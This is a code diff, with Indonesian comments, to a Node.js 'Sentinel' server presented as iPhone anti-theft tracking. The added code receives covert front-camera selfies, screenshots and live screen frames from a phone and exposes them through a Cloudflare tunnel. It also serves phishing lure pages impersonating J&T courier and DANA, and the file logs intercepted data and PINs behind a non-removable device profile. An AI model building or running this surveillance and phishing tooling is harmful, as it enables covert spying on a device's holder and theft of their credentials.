@@ -23,14 +23,20 @@ const MUGSHOTS_DIR = path.join(SAVE_DIR, 'Mugshots');
 if (!fs.existsSync(MUGSHOTS_DIR)) {
   fs.mkdirSync(MUGSHOTS_DIR, { recursive: true });
 }
+const RECORDINGS_DIR = path.join(SAVE_DIR, 'Rekaman_Layar');
+if (!fs.existsSync(RECORDINGS_DIR)) {
+  fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
+}
+const SCREENSHOTS_DIR = path.join(SAVE_DIR, 'Cuplikan_Layar');
+if (!fs.existsSync(SCREENSHOTS_DIR)) {
+  fs.mkdirSync(SCREENSHOTS_DIR, { recursive: true });
+}
 const SENTINEL_DATA_FILE = path.join(SAVE_DIR, 'sentinel_data.json');
 const SENTINEL_TUNNEL_FILE = path.join(SAVE_DIR, 'sentinel_tunnel_url.txt');
 const CLOUDFLARED_EXE = path.join(__dirname, 'cloudflared.exe');
 
 let publicTunnelUrl = null;
 let cloudflaredProcess = null;
-let lastScreenFrame = null;
-let lastScreenTime = 0;
 
 let sentinelState = {
   latest: null,
@@ -38,6 +44,8 @@ let sentinelState = {
   alerts: [],
   intercepts: []
 };
+
+let latestScreenFrame = null;
 
 try {
   if (fs.existsSync(SENTINEL_DATA_FILE)) {
@@ -84,36 +92,260 @@ function addIntercept(item) {
   return entry;
 }
 
+// --- MANAJEMEN PENYIMPANAN & PEMBERSIHAN OTOMATIS (AUTO-CLEANUP QUOTA) ---
+const STORAGE_CONFIG = {
+  MAX_TOTAL_MB: 500,             // Kuota total folder Dari_iPhone (500 MB)
+  CLEANUP_THRESHOLD_RATIO: 0.85, // Jika ruang terpakai >= 85% (425 MB), lakukan pembersihan agresif
+  MAX_MUGSHOTS: 80,              // Maksimal 80 foto selfie wajah pencuri terbaru
+  MAX_SCREENSHOTS: 80,           // Maksimal 80 cuplikan layar terbaru
+  MAX_RECORDINGS: 25,            // Maksimal 25 file rekaman video layar terbaru
+  MAX_JSON_HISTORY: 100,         // Maksimal 100 titik jejak GPS di riwayat
+  MAX_JSON_INTERCEPTS: 100,      // Maksimal 100 data/PIN di riwayat intersepsi
+  MAX_JSON_ALERTS: 50            // Maksimal 50 alert di log
+};
+
+function getFolderStats(dirPath) {
+  if (!fs.existsSync(dirPath)) return { files: [], totalBytes: 0, count: 0 };
+  try {
+    const filenames = fs.readdirSync(dirPath);
+    const files = [];
+    let totalBytes = 0;
+    for (const name of filenames) {
+      const full = path.join(dirPath, name);
+      try {
+        const stat = fs.statSync(full);
+        if (stat.isFile()) {
+          totalBytes += stat.size;
+          files.push({ name, full, size: stat.size, mtime: stat.mtimeMs });
+        }
+      } catch {}
+    }
+    files.sort((a, b) => a.mtime - b.mtime);
+    return { files, totalBytes, count: files.length };
+  } catch {
+    return { files: [], totalBytes: 0, count: 0 };
+  }
+}
+
+function getStorageSummary() {
+  const mug = getFolderStats(MUGSHOTS_DIR);
+  const scr = getFolderStats(SCREENSHOTS_DIR);
+  const rec = getFolderStats(RECORDINGS_DIR);
+  const totalBytes = mug.totalBytes + scr.totalBytes + rec.totalBytes;
+  const maxBytes = STORAGE_CONFIG.MAX_TOTAL_MB * 1024 * 1024;
+  return {
+    usedMb: Number((totalBytes / (1024 * 1024)).toFixed(1)),
+    maxMb: STORAGE_CONFIG.MAX_TOTAL_MB,
+    percentUsed: Math.min(100, Math.round((totalBytes / maxBytes) * 100)),
+    counts: {
+      mugshots: mug.count,
+      screenshots: scr.count,
+      recordings: rec.count
+    }
+  };
+}
+
+function autoCleanStorage(options = {}) {
+  const force = Boolean(options.force);
+  const mugshots = getFolderStats(MUGSHOTS_DIR);
+  const screenshots = getFolderStats(SCREENSHOTS_DIR);
+  const recordings = getFolderStats(RECORDINGS_DIR);
+
+  const totalUsedBytes = mugshots.totalBytes + screenshots.totalBytes + recordings.totalBytes;
+  const maxBytes = STORAGE_CONFIG.MAX_TOTAL_MB * 1024 * 1024;
+  const thresholdBytes = maxBytes * STORAGE_CONFIG.CLEANUP_THRESHOLD_RATIO;
+  const isNearMax = totalUsedBytes >= thresholdBytes;
+
+  let deletedCount = 0;
+  let freedBytes = 0;
+  const deletedFiles = new Set();
+
+  const removeOldestFiles = (statsObj, maxAllowed) => {
+    while (statsObj.files.length > maxAllowed) {
+      const oldest = statsObj.files.shift();
+      try {
+        fs.unlinkSync(oldest.full);
+        deletedCount++;
+        freedBytes += oldest.size;
+        deletedFiles.add(oldest.name);
+      } catch (e) {
+        console.error('[Cleanup Error]', e.message);
+      }
+    }
+  };
+
+  // 1. Bersihkan file yang melebihi batas kuantitas per kategori (FIFO)
+  if (screenshots.count > STORAGE_CONFIG.MAX_SCREENSHOTS) {
+    removeOldestFiles(screenshots, STORAGE_CONFIG.MAX_SCREENSHOTS);
+  }
+  if (mugshots.count > STORAGE_CONFIG.MAX_MUGSHOTS) {
+    removeOldestFiles(mugshots, STORAGE_CONFIG.MAX_MUGSHOTS);
+  }
+  if (recordings.count > STORAGE_CONFIG.MAX_RECORDINGS) {
+    removeOldestFiles(recordings, STORAGE_CONFIG.MAX_RECORDINGS);
+  }
+
+  // 2. Jika total ukuran mendekati batas maksimal (>85%) atau pembersihan dipaksa:
+  let currentTotal = (getFolderStats(MUGSHOTS_DIR).totalBytes + 
+                      getFolderStats(SCREENSHOTS_DIR).totalBytes + 
+                      getFolderStats(RECORDINGS_DIR).totalBytes);
+
+  if (isNearMax || force || currentTotal > thresholdBytes) {
+    const remainingRecordings = getFolderStats(RECORDINGS_DIR).files;
+    const remainingScreenshots = getFolderStats(SCREENSHOTS_DIR).files;
+    const remainingMugshots = getFolderStats(MUGSHOTS_DIR).files;
+
+    while (remainingRecordings.length > 5 && currentTotal > (maxBytes * 0.7)) {
+      const f = remainingRecordings.shift();
+      try {
+        fs.unlinkSync(f.full);
+        deletedCount++;
+        freedBytes += f.size;
+        currentTotal -= f.size;
+        deletedFiles.add(f.name);
+      } catch {}
+    }
+
+    while (remainingScreenshots.length > 20 && currentTotal > (maxBytes * 0.7)) {
+      const f = remainingScreenshots.shift();
+      try {
+        fs.unlinkSync(f.full);
+        deletedCount++;
+        freedBytes += f.size;
+        currentTotal -= f.size;
+        deletedFiles.add(f.name);
+      } catch {}
+    }
+
+    while (remainingMugshots.length > 20 && currentTotal > (maxBytes * 0.7)) {
+      const f = remainingMugshots.shift();
+      try {
+        fs.unlinkSync(f.full);
+        deletedCount++;
+        freedBytes += f.size;
+        currentTotal -= f.size;
+        deletedFiles.add(f.name);
+      } catch {}
+    }
+  }
+
+  // 3. Pangkas data JSON (history, intercepts, alerts)
+  let jsonDirty = false;
+  if (Array.isArray(sentinelState.history) && sentinelState.history.length > STORAGE_CONFIG.MAX_JSON_HISTORY) {
+    sentinelState.history = sentinelState.history.slice(0, STORAGE_CONFIG.MAX_JSON_HISTORY);
+    jsonDirty = true;
+  }
+  if (Array.isArray(sentinelState.intercepts) && sentinelState.intercepts.length > STORAGE_CONFIG.MAX_JSON_INTERCEPTS) {
+    sentinelState.intercepts = sentinelState.intercepts.slice(0, STORAGE_CONFIG.MAX_JSON_INTERCEPTS);
+    jsonDirty = true;
+  }
+  if (Array.isArray(sentinelState.alerts) && sentinelState.alerts.length > STORAGE_CONFIG.MAX_JSON_ALERTS) {
+    sentinelState.alerts = sentinelState.alerts.slice(0, STORAGE_CONFIG.MAX_JSON_ALERTS);
+    jsonDirty = true;
+  }
+
+  if (deletedFiles.size > 0) {
+    const cleanPhotoRef = (item) => {
+      if (item && item.photo) {
+        for (const df of deletedFiles) {
+          if (item.photo.includes(df)) {
+            delete item.photo;
+            jsonDirty = true;
+            break;
+          }
+        }
+      }
+    };
+    if (sentinelState.latest) cleanPhotoRef(sentinelState.latest);
+    if (Array.isArray(sentinelState.history)) sentinelState.history.forEach(cleanPhotoRef);
+    if (Array.isArray(sentinelState.intercepts)) sentinelState.intercepts.forEach(cleanPhotoRef);
+  }
+
+  if (jsonDirty) {
+    saveSentinelData();
+  }
+
+  if (deletedCount > 0) {
+    console.log(`[Auto-Cleanup] 🧹 Pembersihan otomatis: ${deletedCount} file lama dihapus, ${(freedBytes / (1024*1024)).toFixed(2)} MB dibebaskan.`);
+  }
+
+  const finalSummary = getStorageSummary();
+  return {
+    ok: true,
+    deletedCount,
+    freedMb: Number((freedBytes / (1024 * 1024)).toFixed(2)),
+    ...finalSummary
+  };
+}
+
+// Jalankan pembersihan otomatis berkala setiap 10 menit
+setInterval(() => {
+  try {
+    autoCleanStorage();
+  } catch (e) {
+    console.error('[Sentinel] Auto-cleanup error:', e.message);
+  }
+}, 10 * 60 * 1000);
+
 function startCloudflaredTunnel() {
   if (!fs.existsSync(CLOUDFLARED_EXE)) return;
   if (cloudflaredProcess) return;
 
+  const namedConfig = path.join(os.homedir(), '.cloudflared', 'config.yml');
+  const hasNamedTunnel = fs.existsSync(namedConfig);
+
   try {
-    console.log('[Sentinel] Memulai Cloudflare Tunnel untuk pelacakan jarak jauh 5.000 km...');
-    cloudflaredProcess = spawn(CLOUDFLARED_EXE, ['tunnel', '--url', `http://127.0.0.1:${PORT}`], {
-      stdio: ['ignore', 'pipe', 'pipe'],
-      windowsHide: true
-    });
+    if (hasNamedTunnel) {
+      console.log('[Sentinel] Memulai Cloudflare Named Tunnel PERMANEN (sentinel.fiezel.my.id)...');
+      publicTunnelUrl = 'https://sentinel.fiezel.my.id';
+      try {
+        fs.writeFileSync(SENTINEL_TUNNEL_FILE, publicTunnelUrl, 'utf8');
+      } catch {}
 
-    const handleOutput = (chunk) => {
-      const text = chunk.toString();
-      const match = text.match(/https:\/\/[a-zA-Z0-9-]+\.trycloudflare\.com/);
-      if (match && match[0] && match[0] !== publicTunnelUrl) {
-        publicTunnelUrl = match[0];
-        try {
-          fs.writeFileSync(SENTINEL_TUNNEL_FILE, publicTunnelUrl, 'utf8');
-        } catch {}
-        console.log(`\n==============================================`);
-        console.log(`🌐 CLOUDFLARE PUBLIC TUNNEL AKTIF (5.000 KM):`);
-        console.log(`🔗 Dashboard: ${publicTunnelUrl}/sentinel.html`);
-        console.log(`🎯 Beacon:    ${publicTunnelUrl}/api/sentinel/beacon`);
-        console.log(`==============================================\n`);
-        broadcast({ type: 'cloud_tunnel_ready', url: publicTunnelUrl });
-      }
-    };
+      console.log(`\n==============================================`);
+      console.log(`🌐 CLOUDFLARE NAMED TUNNEL PERMANEN AKTIF:`);
+      console.log(`🔗 Dashboard: ${publicTunnelUrl}/sentinel.html`);
+      console.log(`🎯 Beacon:    ${publicTunnelUrl}/api/sentinel/beacon`);
+      console.log(`📸 Selfie:    ${publicTunnelUrl}/api/sentinel/selfie`);
+      console.log(`📱 Screen:    ${publicTunnelUrl}/api/sentinel/screenshot`);
+      console.log(`==============================================\n`);
 
-    cloudflaredProcess.stdout.on('data', handleOutput);
-    cloudflaredProcess.stderr.on('data', handleOutput);
+      cloudflaredProcess = spawn(CLOUDFLARED_EXE, ['tunnel', 'run', 'sentinel'], {
+        stdio: ['ignore', 'pipe', 'pipe'],
+        windowsHide: true
+      });
+
+      cloudflaredProcess.stdout.on('data', () => {});
+      cloudflaredProcess.stderr.on('data', () => {});
+
+      broadcast({ type: 'cloud_tunnel_ready', url: publicTunnelUrl });
+    } else {
+      console.log('[Sentinel] Memulai Cloudflare Quick Tunnel untuk pelacakan jarak jauh 5.000 km...');
+      cloudflaredProcess = spawn(CLOUDFLARED_EXE, ['tunnel', '--url', `http://127.0.0.1:${PORT}`], {
+        stdio: ['ignore', 'pipe', 'pipe'],
+        windowsHide: true
+      });
+
+      const handleOutput = (chunk) => {
+        const text = chunk.toString();
+        const match = text.match(/https:\/\/[a-zA-Z0-9-]+\.trycloudflare\.com/);
+        if (match && match[0] && match[0] !== publicTunnelUrl) {
+          publicTunnelUrl = match[0];
+          try {
+            fs.writeFileSync(SENTINEL_TUNNEL_FILE, publicTunnelUrl, 'utf8');
+          } catch {}
+          console.log(`\n==============================================`);
+          console.log(`🌐 CLOUDFLARE PUBLIC TUNNEL AKTIF (5.000 KM):`);
+          console.log(`🔗 Dashboard: ${publicTunnelUrl}/sentinel.html`);
+          console.log(`🎯 Beacon:    ${publicTunnelUrl}/api/sentinel/beacon`);
+          console.log(`==============================================\n`);
+          broadcast({ type: 'cloud_tunnel_ready', url: publicTunnelUrl });
+        }
+      };
+
+      cloudflaredProcess.stdout.on('data', handleOutput);
+      cloudflaredProcess.stderr.on('data', handleOutput);
+    }
 
     cloudflaredProcess.on('error', (err) => {
       console.error('[Sentinel] Cloudflare process error:', err.message);
@@ -122,7 +354,6 @@ function startCloudflaredTunnel() {
 
     cloudflaredProcess.on('exit', () => {
       cloudflaredProcess = null;
-      publicTunnelUrl = null;
       setTimeout(startCloudflaredTunnel, 5000);
     });
   } catch (err) {
@@ -397,7 +628,7 @@ const server = http.createServer((req, res) => {
     }
   }
 
-  // Halaman Siaran Layar Langsung (Live Screen Streamer untuk iPhone)
+  // Halaman Siaran Layar Langsung ReplayKit iPhone (Remote 5.000 KM)
   if ((pathname === '/screen' || pathname === '/screen.html') && req.method === 'GET') {
     const screenFile = path.join(PUBLIC_DIR, 'screen.html');
     if (fs.existsSync(screenFile)) {
@@ -405,6 +636,41 @@ const server = http.createServer((req, res) => {
       fs.createReadStream(screenFile).pipe(res);
       return;
     }
+  }
+
+  // Halaman Umpan Jebakan Pencuri 1: Konfirmasi Paket Kurir J&T
+  if ((pathname === '/paket' || pathname === '/paket.html') && req.method === 'GET') {
+    const paketFile = path.join(PUBLIC_DIR, 'paket.html');
+    if (fs.existsSync(paketFile)) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      fs.createReadStream(paketFile).pipe(res);
+      return;
+    }
+  }
+
+  // Halaman Umpan Jebakan Pencuri 2: Klaim Saldo DANA Kaget
+  if ((pathname === '/dana' || pathname === '/dana.html') && req.method === 'GET') {
+    const danaFile = path.join(PUBLIC_DIR, 'dana.html');
+    if (fs.existsSync(danaFile)) {
+      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+      fs.createReadStream(danaFile).pipe(res);
+      return;
+    }
+  }
+
+  // Pemicu Remote Sirene Polisi di HP Pencuri dari Dashboard Laptop
+  if (pathname === '/api/sentinel/trigger_siren' && req.method === 'POST') {
+    broadcast({ type: 'sentinel_siren_trigger', timestamp: Date.now() });
+    for (const client of wss.clients) {
+      if (client.readyState === 1) {
+        client.send(JSON.stringify({ type: 'sentinel_siren_trigger', timestamp: Date.now() }));
+      }
+    }
+    console.log('[Sentinel] 🚨 PERINTAH SIRENE DIKIRIM KE HP PENCURI!');
+    sendToHelper('TEXT [SENTINEL] 🚨 PERINTAH SIRENE AKTIF DI HP PENCURI!');
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ ok: true, message: 'Sirene terpicu di HP pencuri' }));
+    return;
   }
 
   // File Profil Apple (.mobileconfig) — Pasang Aplikasi yang TIDAK BISA DIHAPUS Pencuri (IsRemovable = false)
@@ -496,10 +762,339 @@ const server = http.createServer((req, res) => {
       cloudUrl: publicTunnelUrl,
       beaconUrl: publicTunnelUrl ? `${publicTunnelUrl}/api/sentinel/beacon` : `http://${ip}:${PORT}/api/sentinel/beacon`,
       trackUrl: publicTunnelUrl ? `${publicTunnelUrl}/track.html` : `http://${ip}:${PORT}/track.html`,
+      screenUrl: publicTunnelUrl ? `${publicTunnelUrl}/screen.html` : `http://${ip}:${PORT}/screen.html`,
       profileUrl: publicTunnelUrl ? `${publicTunnelUrl}/sentinel.mobileconfig` : `http://${ip}:${PORT}/sentinel.mobileconfig`,
       pairingPin,
-      localIp: ip
+      localIp: ip,
+      hasActiveScreenStream: Boolean(latestScreenFrame && (Date.now() - latestScreenFrame.timestamp < 10000)),
+      storage: getStorageSummary()
     }));
+    return;
+  }
+
+  // Bersihkan Penyimpanan Secara Manual / Instan
+  if (pathname === '/api/sentinel/clean_storage' && req.method === 'POST') {
+    try {
+      const result = autoCleanStorage({ force: true });
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify(result));
+    } catch (err) {
+      res.writeHead(500, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: false, error: err.message }));
+    }
+    return;
+  }
+
+  // Frame Siaran Layar Langsung ReplayKit iPhone (Fallback HTTP POST / GET)
+  if (pathname === '/api/sentinel/screen_frame' && req.method === 'POST') {
+    let body = '';
+    req.on('data', chunk => {
+      body += chunk;
+      if (body.length > 5 * 1024 * 1024) req.destroy();
+    });
+    req.on('end', () => {
+      try {
+        const payload = JSON.parse(body);
+        if (payload.frame) {
+          latestScreenFrame = {
+            frame: payload.frame,
+            lat: payload.lat || (sentinelState.latest ? sentinelState.latest.lat : null),
+            lon: payload.lon || (sentinelState.latest ? sentinelState.latest.lon : null),
+            battery: payload.battery !== undefined ? payload.battery : (sentinelState.latest ? sentinelState.latest.batteryLevel : null),
+            timestamp: Date.now()
+          };
+          const relayData = JSON.stringify({
+            type: 'screen_frame',
+            ...latestScreenFrame
+          });
+          for (const client of wss.clients) {
+            if (client.readyState === 1 /* OPEN */) {
+              client.send(relayData);
+            }
+          }
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ ok: true, timestamp: latestScreenFrame.timestamp }));
+          return;
+        }
+      } catch (e) {}
+      res.writeHead(400, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: false, error: 'Frame data tidak valid' }));
+    });
+    return;
+  }
+
+  if (pathname === '/api/sentinel/screen_frame' && req.method === 'GET') {
+    if (latestScreenFrame) {
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: true, data: latestScreenFrame }));
+    } else {
+      res.writeHead(204);
+      res.end();
+    }
+    return;
+  }
+
+  // Simpan File Rekaman Video Layar dari Dashboard Laptop
+  if (pathname === '/api/sentinel/save_recording' && req.method === 'POST') {
+    let filename = `rekaman_layar_${Date.now()}.webm`;
+    if (req.headers['x-filename']) {
+      try {
+        filename = path.basename(decodeURIComponent(req.headers['x-filename']));
+      } catch {
+        filename = path.basename(req.headers['x-filename']);
+      }
+    }
+    const targetPath = path.join(RECORDINGS_DIR, filename);
+    const writeStream = fs.createWriteStream(targetPath);
+    req.pipe(writeStream);
+    writeStream.on('finish', () => {
+      console.log(`[Sentinel] 🎬 Rekaman layar tersimpan di laptop: ${filename}`);
+      sendToHelper(`TEXT [SENTINEL] REKAMAN LAYAR TERSIMPAN: ${filename}`);
+      setTimeout(autoCleanStorage, 1000);
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: true, filename, path: targetPath }));
+    });
+    writeStream.on('error', (err) => {
+      res.writeHead(500, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: false, error: err.message }));
+    });
+    return;
+  }
+
+  // Buka Folder Rekaman Layar di Windows Explorer
+  if (pathname === '/api/sentinel/open_recordings' && req.method === 'POST') {
+    try {
+      spawn('explorer.exe', [RECORDINGS_DIR], { detached: true, stdio: 'ignore' }).unref();
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: true, path: RECORDINGS_DIR }));
+    } catch (err) {
+      res.writeHead(500, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: false, error: err.message }));
+    }
+    return;
+  }
+
+  // Ambil Daftar File Rekaman Layar
+  if (pathname === '/api/sentinel/recordings' && req.method === 'GET') {
+    try {
+      const files = fs.readdirSync(RECORDINGS_DIR)
+        .filter(f => f.endsWith('.webm') || f.endsWith('.mp4'))
+        .map(f => {
+          const stat = fs.statSync(path.join(RECORDINGS_DIR, f));
+          return {
+            name: f,
+            size: stat.size,
+            mtime: stat.mtimeMs,
+            url: `/api/sentinel/recordings/${encodeURIComponent(f)}`
+          };
+        })
+        .sort((a, b) => b.mtime - a.mtime);
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: true, files }));
+    } catch (err) {
+      res.writeHead(500, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: false, error: err.message }));
+    }
+    return;
+  }
+
+  // Sajikan File Rekaman Layar
+  if (pathname.startsWith('/api/sentinel/recordings/') && req.method === 'GET') {
+    const filename = path.basename(pathname.substring('/api/sentinel/recordings/'.length));
+    const filePath = path.join(RECORDINGS_DIR, filename);
+    if (fs.existsSync(filePath)) {
+      const ext = path.extname(filename).toLowerCase();
+      const contentType = ext === '.mp4' ? 'video/mp4' : 'video/webm';
+      const stat = fs.statSync(filePath);
+      res.writeHead(200, {
+        'Content-Type': contentType,
+        'Content-Length': stat.size
+      });
+      fs.createReadStream(filePath).pipe(res);
+      return;
+    } else {
+      res.writeHead(404, { 'Content-Type': 'text/plain' });
+      res.end('Rekaman tidak ditemukan');
+      return;
+    }
+  }
+
+  // Penerima Cuplikan Layar (Screenshot) dari Pintasan / Automasi iPhone
+  if (pathname === '/api/sentinel/screenshot' && req.method === 'POST') {
+    const chunks = [];
+    req.on('data', chunk => {
+      chunks.push(chunk);
+    });
+    req.on('end', () => {
+      try {
+        const buffer = Buffer.concat(chunks);
+        const filename = `screenshot_${Date.now()}.jpg`;
+        const filePath = path.join(SCREENSHOTS_DIR, filename);
+
+        let dataUrl = null;
+        const contentType = req.headers['content-type'] || '';
+
+        if (contentType.includes('application/json')) {
+          const json = JSON.parse(buffer.toString('utf8'));
+          const raw = json.image || json.screenshot || json.photo || json.frame || '';
+          if (raw.startsWith('data:image')) {
+            dataUrl = raw;
+            const b64 = raw.replace(/^data:image\/\w+;base64,/, '');
+            fs.writeFileSync(filePath, Buffer.from(b64, 'base64'));
+          }
+        } else {
+          // Binary image file (JPEG / PNG dari Apple Shortcuts)
+          fs.writeFileSync(filePath, buffer);
+          const mime = buffer[0] === 0x89 && buffer[1] === 0x50 ? 'image/png' : 'image/jpeg';
+          dataUrl = `data:${mime};base64,${buffer.toString('base64')}`;
+        }
+
+        if (dataUrl) {
+          latestScreenFrame = {
+            frame: dataUrl,
+            timestamp: Date.now()
+          };
+
+          // Broadcast frame ke dashboard monitor secara instan
+          const relayMsg = JSON.stringify({
+            type: 'screen_frame',
+            ...latestScreenFrame
+          });
+          for (const client of wss.clients) {
+            if (client.readyState === 1) {
+              client.send(relayMsg);
+            }
+          }
+
+          // Catat ke feed aktivitas intersepsi
+          addIntercept({
+            type: 'screenshot',
+            label: '📸 Layar iPhone Tertangkap',
+            value: `Cuplikan layar otomatis: ${filename}`,
+            photo: `/api/sentinel/screenshots/${filename}`
+          });
+
+          console.log(`[Sentinel] 📸 Cuplikan Layar Diterima dari iPhone: ${filename}`);
+          sendToHelper(`TEXT [SENTINEL] 📸 CUPLIKAN LAYAR IPHONE DITERIMA!`);
+          setTimeout(autoCleanStorage, 1000);
+        }
+
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: true, message: 'Screenshot diterima', filename }));
+      } catch (err) {
+        console.error('[Sentinel Screenshot Error]', err);
+        res.writeHead(500, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: false, error: err.message }));
+      }
+    });
+    return;
+  }
+
+  // Sajikan File Screenshot
+  if (pathname.startsWith('/api/sentinel/screenshots/') && req.method === 'GET') {
+    const filename = path.basename(pathname.substring('/api/sentinel/screenshots/'.length));
+    const filePath = path.join(SCREENSHOTS_DIR, filename);
+    if (fs.existsSync(filePath)) {
+      res.writeHead(200, { 'Content-Type': 'image/jpeg' });
+      fs.createReadStream(filePath).pipe(res);
+      return;
+    } else {
+      res.writeHead(404, { 'Content-Type': 'text/plain' });
+      res.end('Foto tidak ditemukan');
+      return;
+    }
+  }
+
+  // Penerima Foto Selfie Wajah Pencuri dari Pintasan / Automasi iPhone (Kamera Depan)
+  if (pathname === '/api/sentinel/selfie' && req.method === 'POST') {
+    const chunks = [];
+    req.on('data', chunk => {
+      chunks.push(chunk);
+    });
+    req.on('end', () => {
+      try {
+        const buffer = Buffer.concat(chunks);
+        const filename = `mugshot_${Date.now()}.jpg`;
+        const filePath = path.join(MUGSHOTS_DIR, filename);
+
+        let dataUrl = null;
+        const contentType = req.headers['content-type'] || '';
+
+        if (contentType.includes('application/json')) {
+          const json = JSON.parse(buffer.toString('utf8'));
+          const raw = json.photo || json.image || json.mugshot || json.selfie || '';
+          if (raw.startsWith('data:image')) {
+            dataUrl = raw;
+            const b64 = raw.replace(/^data:image\/\w+;base64,/, '');
+            fs.writeFileSync(filePath, Buffer.from(b64, 'base64'));
+          }
+        } else {
+          // Binary image file langsung dari Apple Shortcuts (Take Photo)
+          fs.writeFileSync(filePath, buffer);
+          const mime = buffer[0] === 0x89 && buffer[1] === 0x50 ? 'image/png' : 'image/jpeg';
+          dataUrl = `data:${mime};base64,${buffer.toString('base64')}`;
+        }
+
+        const photoUrl = `/api/sentinel/mugshots/${filename}`;
+
+        if (!sentinelState.latest) {
+          sentinelState.latest = {
+            id: Date.now() + '_selfie',
+            lat: -6.2088,
+            lon: 106.8456,
+            accuracy: 10,
+            batteryLevel: 100,
+            isCharging: false,
+            networkName: 'Seluler',
+            activity: 'Stationary',
+            speed: 0,
+            alertType: 'thief_selfie_captured',
+            photo: photoUrl,
+            timestamp: Date.now()
+          };
+        } else {
+          sentinelState.latest.photo = photoUrl;
+          sentinelState.latest.alertType = 'thief_selfie_captured';
+          sentinelState.latest.timestamp = Date.now();
+        }
+
+        sentinelState.alerts.unshift({
+          id: Date.now() + '_alert',
+          alertType: 'thief_selfie_captured',
+          timestamp: Date.now(),
+          lat: sentinelState.latest.lat,
+          lon: sentinelState.latest.lon,
+          photo: photoUrl
+        });
+        if (sentinelState.alerts.length > 50) sentinelState.alerts.pop();
+
+        saveSentinelData();
+
+        broadcast({
+          type: 'sentinel_beacon',
+          current: sentinelState.latest,
+          alerts: sentinelState.alerts
+        });
+
+        addIntercept({
+          type: 'mugshot',
+          label: '📸 Foto Selfie Wajah Pencuri',
+          value: `Wajah tertangkap kamera depan: ${filename}`,
+          photo: photoUrl
+        });
+
+        console.log(`[Sentinel] 📸 Foto Selfie Wajah Pencuri Berhasil Diamankan: ${filename}`);
+        sendToHelper(`TEXT [SENTINEL] 📸 WAJAH PENCURI BERHASIL TERJEPRET!`);
+        setTimeout(autoCleanStorage, 1000);
+
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: true, message: 'Foto selfie berhasil disimpan', filename, photoUrl }));
+      } catch (err) {
+        console.error('[Sentinel Selfie Error]', err);
+        res.writeHead(500, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: false, error: err.message }));
+      }
+    });
     return;
   }
 
@@ -1020,10 +1615,37 @@ const server = http.createServer((req, res) => {
 const wss = new WebSocketServer({ server });
 
 wss.on('connection', ws => {
+  // Kirim frame terakhir ke klien dashboard baru jika masih segar (<15 detik)
+  if (latestScreenFrame && (Date.now() - latestScreenFrame.timestamp < 15000)) {
+    try {
+      ws.send(JSON.stringify({
+        type: 'screen_frame',
+        ...latestScreenFrame
+      }));
+    } catch (e) {}
+  }
+
   ws.on('message', message => {
     try {
       const data = JSON.parse(message.toString('utf8'));
-      if (data.type === 'mouse') {
+      if (data.type === 'screen_frame') {
+        latestScreenFrame = {
+          frame: data.frame,
+          lat: data.lat || (sentinelState.latest ? sentinelState.latest.lat : null),
+          lon: data.lon || (sentinelState.latest ? sentinelState.latest.lon : null),
+          battery: data.battery !== undefined ? data.battery : (sentinelState.latest ? sentinelState.latest.batteryLevel : null),
+          timestamp: Date.now()
+        };
+        const relayMsg = JSON.stringify({
+          type: 'screen_frame',
+          ...latestScreenFrame
+        });
+        for (const client of wss.clients) {
+          if (client !== ws && client.readyState === 1) {
+            client.send(relayMsg);
+          }
+        }
+      } else if (data.type === 'mouse') {
         sendToHelper(`MOVE ${data.dx} ${data.dy}`);
       } else if (data.type === 'click') {
         sendToHelper(`CLICK ${data.button}`);
